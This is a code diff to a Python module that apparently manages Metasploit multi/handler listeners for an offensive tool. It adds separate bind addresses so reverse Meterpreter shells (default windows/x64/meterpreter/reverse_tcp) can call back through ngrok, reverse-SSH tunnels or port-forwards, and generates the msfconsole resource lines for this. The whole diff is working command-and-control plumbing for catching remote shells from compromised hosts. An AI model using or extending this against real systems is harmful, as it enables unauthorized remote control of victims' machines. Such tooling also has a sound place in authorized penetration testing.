@@ -105,10 +105,17 @@ class MsfHandlerProcess:
     """Wraps a single long-running msfconsole multi/handler subprocess."""
 
     def __init__(self, lhost: str, lport: int, payload: str,
-                 on_session_opened: Optional[Callable[[str, Dict], None]] = None):
+                 on_session_opened: Optional[Callable[[str, Dict], None]] = None,
+                 bind_host: Optional[str] = None, bind_port: Optional[int] = None):
         self.handler_id   = uuid.uuid4().hex[:8]
-        self.lhost        = lhost
-        self.lport        = lport
+        self.lhost        = lhost          # advertised address (payload LHOST)
+        self.lport        = lport          # advertised port (payload LPORT)
+        # Where the listener actually binds. Differs from lhost/lport when the
+        # callback goes through a tunnel or port-forward (ngrok / reverse-SSH /
+        # public IP): the target connects to lhost:lport, which is routed to this
+        # local bind. Defaults to the advertised address (direct LAN/VPS case).
+        self.bind_host    = bind_host or lhost
+        self.bind_port    = bind_port or lport
         self.payload      = payload
         self.status       = "starting"    # starting | listening | stopped | error
         self.started_at   = datetime.now().isoformat()
@@ -132,11 +139,22 @@ class MsfHandlerProcess:
     async def start(self) -> bool:
         """Launch msfconsole with multi/handler. Returns True on success."""
         rc_path = f"/tmp/kmn_handler_{self.handler_id}.rc"
+        # LHOST/LPORT are what the payload dials (the reachable, advertised
+        # address). When the listener must bind elsewhere — behind a tunnel or a
+        # port-forward — ReverseListenerBindAddress/Port point the actual socket
+        # at the local endpoint while the payload still targets the public one.
+        bind_lines = ""
+        if (self.bind_host, self.bind_port) != (self.lhost, self.lport):
+            bind_lines = (
+                f"set ReverseListenerBindAddress {self.bind_host}\n"
+                f"set ReverseListenerBindPort {self.bind_port}\n"
+            )
         rc_lines = (
             f"use multi/handler\n"
             f"set PAYLOAD {self.payload}\n"
             f"set LHOST {self.lhost}\n"
             f"set LPORT {self.lport}\n"
+            f"{bind_lines}"
             f"set ExitOnSession false\n"
             f"set VERBOSE true\n"
             f"exploit -j -z\n"
@@ -385,16 +403,29 @@ class ShellManager:
     async def start_handler(self, lhost: str, lport: int,
                             payload: str = "windows/x64/meterpreter/reverse_tcp",
                             on_session_opened: Optional[Callable[[str, Dict], None]] = None,
+                            bind_host: Optional[str] = None,
+                            bind_port: Optional[int] = None,
                             ) -> MsfHandlerProcess:
-        """Start (or reuse) a multi/handler for the given LHOST:LPORT:payload."""
-        key = f"{lhost}:{lport}"
-        # Reuse an existing live handler for the same address
+        """Start (or reuse) a multi/handler.
+
+        ``lhost``/``lport`` are the advertised (payload) address; ``bind_host``/
+        ``bind_port`` are where the listener actually binds and default to the
+        advertised address. Handlers are deduplicated on the local bind socket,
+        which is what can actually collide.
+        """
+        b_host = bind_host or lhost
+        b_port = bind_port or lport
+        key = f"{lhost}:{lport} (bind {b_host}:{b_port})"
+        # Reuse an existing live handler bound to the same local socket.
         for h in self._handlers.values():
-            if h.lhost == lhost and h.lport == lport and h.status in ("listening", "starting"):
+            if h.bind_host == b_host and h.bind_port == b_port and h.status in ("listening", "starting"):
                 logger.info(f"Reusing handler {h.handler_id} for {key}")
                 return h
 
-        handler = MsfHandlerProcess(lhost, lport, payload, on_session_opened=on_session_opened)
+        handler = MsfHandlerProcess(
+            lhost, lport, payload, on_session_opened=on_session_opened,
+            bind_host=b_host, bind_port=b_port,
+        )
         self._handlers[handler.handler_id] = handler
         await handler.start()
         return handler
